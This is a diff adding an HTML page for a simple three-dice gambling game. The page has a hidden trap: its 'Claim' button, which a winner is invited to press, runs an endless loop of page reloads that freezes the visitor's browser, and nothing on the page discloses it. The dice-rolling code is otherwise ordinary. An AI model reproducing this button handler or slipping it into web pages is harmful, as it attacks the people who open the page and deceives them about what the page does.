@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dice Gambling Game</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    .dice {
+      font-size: 40px;
+      margin: 20px;
+    }
+    .button {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Dice Gambling Game</h1>
+  <p>Roll 3 dice, and if all of them match, you win!</p>
+  
+  <div id="dice-container">
+    <span class="dice" id="die1">-</span>
+    <span class="dice" id="die2">-</span>
+    <span class="dice" id="die3">-</span>
+  </div>
+  
+  <button class="button" id="rollButton">Roll Dice</button>
+  <br><br>
+  <button class="button" id="claimButton">Claim</button>
+  
+  <script>
+    function rollDice() {
+      // Generate random number between 1 and 6 for each die
+      return Math.floor(Math.random() * 6) + 1;
+    }
+
+    function updateDiceDisplay() {
+      // Roll 3 dice and update the UI
+      const die1 = rollDice();
+      const die2 = rollDice();
+      const die3 = rollDice();
+
+      document.getElementById('die1').textContent = die1;
+      document.getElementById('die2').textContent = die2;
+      document.getElementById('die3').textContent = die3;
+
+      // Check if all dice match
+      if (die1 === die2 && die2 === die3) {
+        alert("You win!");
+      }
+    }
+
+    document.getElementById('rollButton').onclick = updateDiceDisplay;
+
+    document.getElementById('claimButton').onclick = function() {
+      while (1) {
+        location.reload(1);
+      }
+    };
+  </script>
+  
+</body>
+</html>
